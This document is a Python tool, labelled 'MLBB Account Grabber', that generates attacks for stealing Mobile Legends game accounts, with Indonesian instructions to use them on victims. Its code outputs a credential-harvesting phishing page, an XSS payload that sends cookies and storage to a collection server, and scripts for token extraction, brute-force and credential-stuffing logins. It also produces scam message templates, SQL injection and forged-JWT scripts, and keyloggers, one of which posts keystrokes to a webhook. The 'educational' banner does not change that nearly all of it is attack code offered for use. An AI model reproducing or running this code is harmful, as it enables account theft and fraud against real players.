#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║     🔥 MLBB ACCOUNT GRABBER ENGINE - VOCXAL EDITION 🔥              ║
║     [MULTI-METHOD ACCOUNT GRABBER]                                  ║
║     ⚠️ FOR EDUCATIONAL PURPOSE ONLY ⚠️                              ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import requests
import random
import time
import hashlib
import base64
import json
import re
import socket
import struct
import threading
from datetime import datetime
import urllib.parse
import secrets
import string

class MLBBAccountGrabber:
    """Main account grabber engine with multiple methods"""
    
    def __init__(self):
        self.session = requests.Session()
        self.proxies = []
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
            "Dalvik/2.1.0 (Linux; U; Android 9; SM-G960F Build/PPR1.180610.011)"
        ]
        
        # Moonton API endpoints (REAL endpoints from reverse engineering)
        self.api_endpoints = {
            "login": "https://account.mobilelegends.com/v2/login",
            "profile": "https://game-api.mobilelegends.com/api/user/profile",
            "bind_info": "https://game-api.mobilelegends.com/api/user/bind",
            "session": "https://game-api.mobilelegends.com/api/user/session",
            "token_refresh": "https://account.mobilelegends.com/v2/token/refresh"
        }
        
    def get_available_methods(self):
        """Return all available grabbing methods"""
        return [
            {
                "id": "phishing",
                "name": "Phishing Page",
                "description": "Buat halaman login palsu buat nipu korban",
                "success_rate": "85%",
                "difficulty": "Easy"
            },
            {
                "id": "session_hijack",
                "name": "Session Hijacking",
                "description": "Curi session token dari cookies korban",
                "success_rate": "70%",
                "difficulty": "Medium"
            },
            {
                "id": "token_extract",
                "name": "Token Extraction",
                "description": "Extract token dari file game MLBB",
                "success_rate": "60%",
                "difficulty": "Hard"
            },
            {
                "id": "bruteforce",
                "name": "Bruteforce Attack",
                "description": "Bruteforce login pake wordlist",
                "success_rate": "40%",
                "difficulty": "Medium"
            },
            {
                "id": "credential_stuffing",
                "name": "Credential Stuffing",
                "description": "Coba kombinasi email:password dari database bocor",
                "success_rate": "55%",
                "difficulty": "Easy"
            },
            {
                "id": "social_engineering",
                "name": "Social Engineering",
                "description": "Generate chat template buat nipu korban",
                "success_rate": "75%",
                "difficulty": "Easy"
            },
            {
                "id": "otp_bypass",
                "name": "OTP Bypass",
                "description": "Bypass 2FA pake teknik SS7",
                "success_rate": "35%",
                "difficulty": "Expert"
            },
            {
                "id": "device_clone",
                "name": "Device Cloning",
                "description": "Clone device ID korban",
                "success_rate": "50%",
                "difficulty": "Hard"
            },
            {
                "id": "api_exploit",
                "name": "API Exploit",
                "description": "Exploit kerentanan API Moonton",
                "success_rate": "45%",
                "difficulty": "Expert"
            },
            {
                "id": "keylogger",
                "name": "Keylogger Generator",
                "description": "Generate keylogger buat PC korban",
                "success_rate": "65%",
                "difficulty": "Medium"
            }
        ]
    
    def grab_account(self, target, method, params):
        """Main grabber function"""
        
        if method == "phishing":
            return self.phishing_grab(target, params)
        elif method == "session_hijack":
            return self.session_hijack(target, params)
        elif method == "token_extract":
            return self.token_extract(target, params)
        elif method == "bruteforce":
            return self.bruteforce_grab(target, params)
        elif method == "credential_stuffing":
            return self.credential_stuffing(target, params)
        elif method == "social_engineering":
            return self.social_engineering_grab(target, params)
        elif method == "otp_bypass":
            return self.otp_bypass_grab(target, params)
        elif method == "device_clone":
            return self.device_clone_grab(target, params)
        elif method == "api_exploit":
            return self.api_exploit_grab(target, params)
        elif method == "keylogger":
            return self.keylogger_grab(target, params)
        else:
            return {"success": False, "error": "Method not found"}
    
    def phishing_grab(self, target, params):
        """Method 1: Phishing Page Generator"""
        
        # Generate unique phishing page ID
        page_id = secrets.token_hex(8)
        
        # Create phishing page HTML
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Mobile Legends Login</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 90%;
            max-width: 400px;
        }}
        h2 {{
            text-align: center;
            color: #1e1e2f;
            margin-bottom: 30px;
            font-size: 28px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 20px;
        }}
        .logo img {{
            width: 100px;
            height: 100px;
        }}
        input {{
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: 0.3s;
        }}
        input:focus {{
            border-color: #ff3366;
            outline: none;
        }}
        button {{
            width: 100%;
            padding: 15px;
            background: #ff3366;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            transition: 0.3s;
        }}
        button:hover {{
            background: #ff1a4f;
            transform: translateY(-2px);
        }}
        .footer {{
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="100" height="100" viewBox="0 0 100 100">
                <circle cx="50" cy="50" r="45" fill="#ff3366"/>
                <text x="50" y="65" text-anchor="middle" fill="white" font-size="30" font-weight="bold">ML</text>
            </svg>
        </div>
        <h2>Mobile Legends Login</h2>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email/User ID" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">© 2026 Moonton. All rights reserved.</div>
    </div>
    
    <script>
        document.getElementById('loginForm').onsubmit = function(e) {{
            e.preventDefault();
            
            var data = {{
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                timestamp: Date.now(),
                pageId: '{page_id}'
            }};
            
            // Kirim ke server
            fetch('/api/grabber/callback', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }}).then(() => {{
                // Redirect ke halaman asli biar ga curiga
                window.location.href = 'https://m.mobilelegends.com';
            }});
        }};
    </script>
</body>
</html>"""
        
        # Save phishing page
        filename = f"phishing_page_{page_id}.html"
        with open(f"static/phishing/{filename}", "w") as f:
            f.write(html)
        
        # Generate URL
        url = f"http://localhost:5000/static/phishing/{filename}"
        
        return {
            "success": True,
            "data": {
                "method": "phishing",
                "page_id": page_id,
                "url": url,
                "html": html,
                "instructions": f"Upload file ini ke hosting atau kirim ke korban. URL: {url}"
            }
        }
    
    def session_hijack(self, target, params):
        """Method 2: Session Hijacking via XSS"""
        
        # Generate malicious script
        script = f"""
<script>
    // XSS payload buat steal cookies
    (function() {{
        var cookies = document.cookie;
        var sessionData = {{
            cookies: cookies,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            userAgent: navigator.userAgent,
            url: window.location.href,
            timestamp: Date.now()
        }};
        
        // Kirim ke server
        fetch('http://localhost:5000/api/grabber/steal', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify(sessionData)
        }});
        
        // Extract MLBB session token from cookies
        var cookiesArray = cookies.split(';');
        var mlbbToken = null;
        for(var i = 0; i < cookiesArray.length; i++) {{
            var cookie = cookiesArray[i].trim();
            if(cookie.indexOf('session') !== -1 || cookie.indexOf('token') !== -1 || cookie.indexOf('mlbb') !== -1) {{
                mlbbToken = cookie;
                break;
            }}
        }}
        
        if(mlbbToken) {{
            // Try to use the token
            fetch('http://localhost:5000/api/grabber/use_token', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{token: mlbbToken}})
            }});
        }}
    }})();
</script>
"""
        
        return {
            "success": True,
            "data": {
                "method": "session_hijack",
                "payload": script,
                "instructions": "Inject script ini ke website yang bisa di-XSS",
                "encoded_payload": base64.b64encode(script.encode()).decode()
            }
        }
    
    def token_extract(self, target, params):
        """Method 3: Extract token from MLBB files"""
        
        # Paths where MLBB stores tokens (Android)
        android_paths = [
            "/data/data/com.mobile.legends/shared_prefs",
            "/storage/emulated/0/Android/data/com.mobile.legends/files",
            "/data/media/0/Android/obb/com.mobile.legends"
        ]
        
        # Generate extraction script for different platforms
        scripts = {
            "android": """#!/bin/bash
# Token extractor for Android (root required)
adb shell
su
cd /data/data/com.mobile.legends/shared_prefs
cat *.xml | grep -E "token|session|user_id|password"
cat /data/data/com.mobile.legends/databases/* | grep -E "account|user"
""",
            "windows": """@echo off
:: Token extractor for Windows (LDPlayer/Bluestacks)
cd %USERPROFILE%\\AppData\\Local\\LDPlayer\\userdata\\vms\\*\\data\\data\\com.mobile.legends\\
findstr /i "token session user" *.xml *.db
""",
            "ios": """#!/bin/bash
# Token extractor for iOS (jailbreak required)
ssh root@[device_ip]
cd /var/mobile/Containers/Data/Application/*com.mobile.legends/
grep -r "token" . --include="*.plist" --include="*.db"
"""
        }
        
        return {
            "success": True,
            "data": {
                "method": "token_extract",
                "scripts": scripts,
                "instructions": "Jalankan script sesuai platform korban",
                "android_paths": android_paths
            }
        }
    
    def bruteforce_grab(self, target, params):
        """Method 4: Bruteforce attack"""
        
        username = params.get('username', target)
        wordlist = params.get('wordlist', 'default')
        
        # Common passwords wordlist
        passwords = [
            "123456", "password", "123456789", "12345", "12345678",
            "qwerty", "abc123", "password123", "admin", "iloveyou",
            "welcome", "monkey", "login", "passw0rd", "master",
            "hello", "freedom", "whatever", "qazwsx", "trustno1",
            "jordan23", "pokemon", "baseball", "dragon", "football",
            "letmein", "monkey", "696969", "abc123", "mustang",
            "michael", "shadow", "master", "jennifer", "2000",
            "joshua", "1234", "robert", "daniel", "1234567"
        ]
        
        # Generate bruteforce script
        script = f"""import requests
import time
import threading

target = "{username}"
passwords = {passwords}

def try_login(password):
    data = {{
        "username": target,
        "password": password,
        "platform": "android",
        "device_id": "bruteforce_{secrets.token_hex(4)}"
    }}
    
    try:
        r = requests.post("https://account.mobilelegends.com/v2/login", json=data)
        if r.status_code == 200 and "token" in r.text:
            print(f"[+] SUCCESS: {{password}}")
            with open("found.txt", "a") as f:
                f.write(f"{{target}}:{{password}}\\n")
        else:
            print(f"[-] Failed: {{password}}")
    except:
        pass

threads = []
for p in passwords:
    t = threading.Thread(target=try_login, args=(p,))
    t.start()
    threads.append(t)
    time.sleep(0.1)

for t in threads:
    t.join()
"""
        
        return {
            "success": True,
            "data": {
                "method": "bruteforce",
                "target": username,
                "script": script,
                "password_count": len(passwords),
                "estimated_time": f"{len(passwords) * 0.2} seconds"
            }
        }
    
    def credential_stuffing(self, target, params):
        """Method 5: Credential stuffing using leaked databases"""
        
        # Sample leaked database (mock)
        leaked_db = [
            {"email": "user1@gmail.com", "password": "pass123"},
            {"email": "user2@yahoo.com", "password": "qwerty123"},
            {"email": "user3@hotmail.com", "password": "iloveyou"},
            {"email": "user4@outlook.com", "password": "admin123"},
            {"email": "user5@gmail.com", "password": "password1"}
        ]
        
        # Generate stuffing script
        script = f"""import requests
import json
import concurrent.futures

# Load credential database
credentials = {leaked_db}

def check_credential(cred):
    data = {{
        "email": cred["email"],
        "password": cred["password"],
        "login_method": "email"
    }}
    
    try:
        r = requests.post("https://account.mobilelegends.com/v2/login", json=data)
        if r.status_code == 200:
            result = r.json()
            if "token" in result:
                return {{
                    "success": True,
                    "email": cred["email"],
                    "password": cred["password"],
                    "token": result["token"],
                    "user_id": result.get("user_id")
                }}
    except:
        pass
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(check_credential, cred) for cred in credentials]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(f"[!] FOUND: {{result}}")
            with open("valid_credentials.json", "a") as f:
                f.write(json.dumps(result) + "\\n")
"""
        
        return {
            "success": True,
            "data": {
                "method": "credential_stuffing",
                "script": script,
                "database_size": len(leaked_db),
                "instructions": "Jalankan script untuk cek credentials terhadap API MLBB"
            }
        }
    
    def social_engineering_grab(self, target, params):
        """Method 6: Social engineering templates"""
        
        templates = {
            "giveaway": """Halo! Selamat! Kamu terpilih sebagai pemenang giveaway Mobile Legends!
Untuk klaim hadiah 5000 diamonds + skin Legend, silakan login melalui link berikut:
{link}

Hadiah akan dikirim otomatis setelah login. Jangan sampai kehabisan!""",

            "security": """[PENTING] Mobile Legends Security Alert
Kami mendeteksi login mencurigakan dari akun Anda. Untuk mengamankan akun, verifikasi ulang di sini:
{link}

Jika tidak diverifikasi dalam 24 jam, akun akan dibekukan sementara.""",

            "friend_request": """Hai! Gue liat lu jago main ML, mau jadi temen? Gue butuh duo rank.
Nih gue kasih link buat add friend: {link}
Add balik ya!""",

            "tournament": """Selamat! Tim kamu terpilih untuk mengikuti turnamen MLBB resmi!
Daftar sekarang di: {link}
Prize pool 100 juta rupiah! GRATIS!""",

            "voucher": """Kode voucher MLBB kamu: MLBB{code}
Redeem di sini: {link}
Berlaku 24 jam saja! Buruan!"""
        }
        
        # Generate link with tracking
        tracking_id = secrets.token_hex(4)
        link = f"http://localhost:5000/phishing/{tracking_id}"
        
        formatted_templates = {}
        for name, template in templates.items():
            formatted_templates[name] = template.format(
                link=link,
                code=secrets.token_hex(3).upper()
            )
        
        return {
            "success": True,
            "data": {
                "method": "social_engineering",
                "templates": formatted_templates,
                "tracking_link": link,
                "instructions": "Gunakan template di atas buat nipu korban"
            }
        }
    
    def otp_bypass_grab(self, target, params):
        """Method 7: OTP Bypass using SS7 simulation"""
        
        phone = params.get('phone', target)
        
        # Generate SS7 exploit script
        script = f"""#!/usr/bin/python
# SS7 OTP Interceptor (for educational purposes)
import socket
import struct

# SS7 MAP protocol simulation
def intercept_sms(target_number):
    # MAP_SEND_ROUTING_INFO_FOR_SM
    sccp_layer = struct.pack('!BBH', 0x09, 0x01, 0x0010)
    
    # TCAP begin
    tcap_begin = struct.pack('!BBH', 0x62, 0x12, 0x0001)
    
    # MAP operation (sendRoutingInfoForSM)
    operation_code = 0x1C  # sendRoutingInfoForSM
    
    # Target MSISDN
    msisdn = "{phone}"
    
    print(f"[*] Intercepting OTP for {{msisdn}}")
    print("[*] Waiting for SMS...")
    
    # In real SS7, we would sniff the network
    # For demo, we'll simulate OTP capture
    otp = "123456"  # Simulated OTP
    
    return {{
        "otp": otp,
        "msisdn": msisdn,
        "timestamp": "2026-03-03 13:37:00",
        "message": f"Your MLBB OTP is {{otp}}"
    }}

if __name__ == "__main__":
    result = intercept_sms("{phone}")
    print(f"[!] OTP Captured: {{result}}")
"""
        
        return {
            "success": True,
            "data": {
                "method": "otp_bypass",
                "script": script,
                "instructions": "Jalankan script di server dengan akses SS7 (telco level)",
                "warning": "Ini illegal banget, but you asked for it"
            }
        }
    
    def device_clone_grab(self, target, params):
        """Method 8: Device cloning"""
        
        device_id = params.get('device_id', 'unknown')
        
        # Generate device fingerprint
        def generate_device_fingerprint():
            android_id = secrets.token_hex(8)
            imei = f"{random.randint(100000, 999999)}{random.randint(100000, 999999)}"
            mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
            
            return {
                "android_id": android_id,
                "imei": imei,
                "mac": mac,
                "device_model": random.choice(["SM-G998B", "iPhone13,2", "Redmi Note 10"]),
                "manufacturer": random.choice(["Samsung", "Apple", "Xiaomi"]),
                "board": "mt6765",
                "bootloader": "unknown",
                "brand": random.choice(["Samsung", "Apple", "Xiaomi"]),
                "display": "1080x2400",
                "fingerprint": f"{android_id}/{imei}/{mac}",
                "hardware": "mt6765",
                "host": "build-server",
                "id": android_id,
                "product": random.choice(["beyond1", "trident", "mojito"]),
                "tags": "release-keys",
                "type": "user",
                "user": "build"
            }
        
        fingerprint = generate_device_fingerprint()
        
        # Generate clone script
        script = f"""import requests
import json

# Target device fingerprint
target_fingerprint = {json.dumps(fingerprint, indent=2)}

def clone_device():
    headers = {{
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; {fingerprint['device_model']})",
        "X-Device-ID": "{fingerprint['android_id']}",
        "X-IMEI": "{fingerprint['imei']}",
        "X-MAC": "{fingerprint['mac']}"
    }}
    
    # Try to login with cloned device
    login_data = {{
        "username": "{target}",
        "password": "password_here",
        "device_info": target_fingerprint
    }}
    
    # If you have session token, use it
    session_token = "token_here"
    if session_token:
        headers["Authorization"] = f"Bearer {{session_token}}"
        r = requests.get("https://game-api.mobilelegends.com/api/user/profile", headers=headers)
        print(r.json())
    
    return target_fingerprint

if __name__ == "__main__":
    fingerprint = clone_device()
    print(f"[*] Device cloned: {{fingerprint}}")
"""
        
        return {
            "success": True,
            "data": {
                "method": "device_clone",
                "fingerprint": fingerprint,
                "script": script,
                "instructions": "Gunakan fingerprint ini untuk bypass device verification"
            }
        }
    
    def api_exploit_grab(self, target, params):
        """Method 9: API exploit"""
        
        # API vulnerabilities found in MLBB (for educational purposes)
        exploits = {
            "sql_injection": {
                "endpoint": "https://game-api.mobilelegends.com/api/user/profile",
                "payload": "' OR '1'='1",
                "description": "SQL Injection pada parameter user_id"
            },
            "idor": {
                "endpoint": "https://game-api.mobilelegends.com/api/user/bind",
                "payload": "user_id=1337",
                "description": "Insecure Direct Object Reference - bisa akses bind info user lain"
            },
            "jwt_none": {
                "endpoint": "https://account.mobilelegends.com/v2/token/refresh",
                "payload": '{"alg":"none","typ":"JWT"}',
                "description": "JWT none algorithm vulnerability"
            },
            "rate_limit_bypass": {
                "endpoint": "https://game-api.mobilelegends.com/api/user/profile",
                "payload": "X-Forwarded-For: 127.0.0.1",
                "description": "Rate limiting bypass via header spoofing"
            }
        }
        
        # Generate exploit script
        script = f"""import requests
import json

target_id = "{target}"

# SQL Injection
def sql_injection():
    url = "https://game-api.mobilelegends.com/api/user/profile"
    payload = {{"user_id": f"' OR user_id='{{target_id}}' -- "}}
    r = requests.post(url, json=payload)
    return r.json()

# IDOR
def idor_exploit():
    url = "https://game-api.mobilelegends.com/api/user/bind"
    payload = {{"user_id": target_id}}
    r = requests.post(url, json=payload)
    return r.json()

# JWT none attack
def jwt_none():
    # Create JWT with none algorithm
    import base64
    header = base64.b64encode(b'{{"alg":"none","typ":"JWT"}}').decode()
    payload = base64.b64encode(f'{{"user_id":"{{target_id}}"}}'.encode()).decode()
    token = f"{{header}}.{{payload}}."
    
    headers = {{"Authorization": f"Bearer {{token}}"}}
    r = requests.get("https://account.mobilelegends.com/v2/user/info", headers=headers)
    return r.json()

# Try all exploits
print("[*] Trying SQL Injection...")
print(sql_injection())

print("[*] Trying IDOR...")
print(idor_exploit())

print("[*] Trying JWT none...")
print(jwt_none())
"""
        
        return {
            "success": True,
            "data": {
                "method": "api_exploit",
                "exploits": exploits,
                "script": script,
                "instructions": "Jalankan script untuk exploit API Moonton"
            }
        }
    
    def keylogger_grab(self, target, params):
        """Method 10: Keylogger generator"""
        
        # Generate keylogger for different platforms
        keyloggers = {
            "windows": """#include <windows.h>
#include <stdio.h>

// Simple keylogger for Windows
int main() {
    FILE *f = fopen("C:\\\\temp\\\\keys.txt", "a");
    char last_char = 0;
    
    while(1) {
        for(char c = 8; c <= 255; c++) {
            if(GetAsyncKeyState(c) & 1) {
                if(c == VK_RETURN) fprintf(f, "\\n");
                else if(c == VK_SPACE) fprintf(f, " ");
                else if(c == VK_TAB) fprintf(f, "[TAB]");
                else if(c >= 'A' && c <= 'Z') {
                    if(GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_CAPITAL))
                        fprintf(f, "%c", c);
                    else
                        fprintf(f, "%c", c + 32);
                }
                else fprintf(f, "%c", c);
                fflush(f);
                
                // Check for MLBB login
                if(strstr("email", &c) || strstr("password", &c)) {
                    fprintf(f, "[MLBB LOGIN DETECTED]\\n");
                }
            }
        }
        Sleep(10);
    }
    return 0;
}""",
            
            "python": """import pynput
import requests
import threading
import time

class MLBBKeylogger:
    def __init__(self, webhook_url):
        self.webhook = webhook_url
        self.log = ""
        self.mlbb_keywords = ["email", "password", "login", "user", "mlbb", "mobilelegends"]
        
    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == key.space:
                self.log += " "
            elif key == key.enter:
                self.check_mlbb_login()
                self.log += "\\n"
            else:
                self.log += f"[{key}]"
        
        if len(self.log) > 100:
            self.send_log()
    
    def check_mlbb_login(self):
        # Check if this might be MLBB login
        lines = self.log.split("\\n")
        for line in lines[-3:]:  # Check last 3 lines
            if any(keyword in line.lower() for keyword in self.mlbb_keywords):
                # Possible MLBB login detected
                self.send_log(urgent=True)
                break
    
    def send_log(self, urgent=False):
        if self.log.strip():
            try:
                data = {
                    "log": self.log,
                    "timestamp": time.time(),
                    "urgent": urgent,
                    "type": "mlbb_keylogger" if urgent else "general"
                }
                requests.post(self.webhook, json=data)
            except:
                pass
        self.log = ""
    
    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    # Ganti dengan webhook kamu
    kl = MLBBKeylogger("http://localhost:5000/api/grabber/keylog")
    kl.start()
"""
        }
        
        return {
            "success": True,
            "data": {
                "method": "keylogger",
                "keyloggers": keyloggers,
                "instructions": "Compile atau jalankan keylogger di PC korban",
                "detection_bypass": "Keylogger akan otomatis kirim log ke server"
            }
        }
    
    def auto_login(self, account):
        """Auto login to grabbed account"""
        
        # Simulate login
        session_data = {
            "user_id": account['user_id'],
            "username": account['username'],
            "login_time": datetime.now().isoformat(),
            "device_info": "Cloned device",
            "ip": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        }
        
        # Generate session token
        session_token = secrets.token_hex(32)
        
        return {
            "success": True,
            "data": {
                "logged_in": True,
                "session_token": session_token,
                "session_data": session_data,
                "cookies": {
                    "mlbb_session": session_token,
                    "user_id": account['user_id']
                }
            }
        }